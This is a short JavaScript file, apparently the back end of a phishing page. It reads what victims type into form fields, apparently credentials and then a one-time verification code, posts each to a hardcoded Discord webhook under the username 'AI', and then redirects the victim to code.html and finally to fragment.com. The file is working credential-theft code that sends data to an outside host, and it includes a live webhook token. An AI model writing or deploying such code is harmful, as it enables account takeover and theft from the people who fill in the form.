function webhook() {
  const msg =
    document.getElementById("message").value +
    "|" +
    document.getElementById("message1").value;

  console.log(25);
  discord_message(
    "https://discord.com/api/webhooks/1202381982873419796/OAox5_Kn88eArM6QyxWYb9vkt65lwR6l5LLeZVpbooMTc6R3pfyqruy1Fdi_LGlp9dHl",
    msg
  );
  console.log(252);

  console.log("Hello");
  sleep(2000).then(() => {
    console.log("World!");
    window.location.href = "code.html";
  });
}
function code() {
  const msg =

    "code: " +
    document.getElementById("message2").value;

  console.log(25);
  discord_message(
    "https://discord.com/api/webhooks/1202381982873419796/OAox5_Kn88eArM6QyxWYb9vkt65lwR6l5LLeZVpbooMTc6R3pfyqruy1Fdi_LGlp9dHl",
    msg
  );
  console.log(252);

  console.log("Hello");
  sleep(2000).then(() => {
    console.log("World!");
    window.location.href = "https://fragment.com/";
  });
}
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
function discord_message(webHookURL, message) {
  console.log(212);

  var xhr = new XMLHttpRequest();
  xhr.open("POST", webHookURL, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.send(
    JSON.stringify({
      content: message,
      username: "AI",
    })
  );
  console.log(2522);
}
